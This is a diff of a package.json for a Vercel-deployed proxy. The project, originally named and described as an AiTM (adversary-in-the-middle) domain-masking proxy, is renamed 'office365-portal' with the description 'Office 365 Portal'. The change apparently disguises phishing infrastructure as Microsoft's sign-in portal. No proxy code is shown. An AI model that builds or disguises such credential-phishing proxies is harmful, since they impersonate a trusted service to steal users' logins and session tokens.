@@ -1,15 +1,15 @@
 {
-  "name": "aitm-domain-mask",
+  "name": "office365-portal",
   "version": "1.0.0",
-  "description": "Domain masking proxy for Azure AiTM Function",
+  "description": "Office 365 Portal",
   "main": "api/proxy.js",
+  "engines": {
+    "node": ">=18.0.0"
+  },
   "scripts": {
     "dev": "vercel dev",
     "deploy": "vercel --prod"
   },
   "dependencies": {},
-  "devDependencies": {},
-  "engines": {
-    "node": ">=18.0.0"
-  }
+  "devDependencies": {}
 }
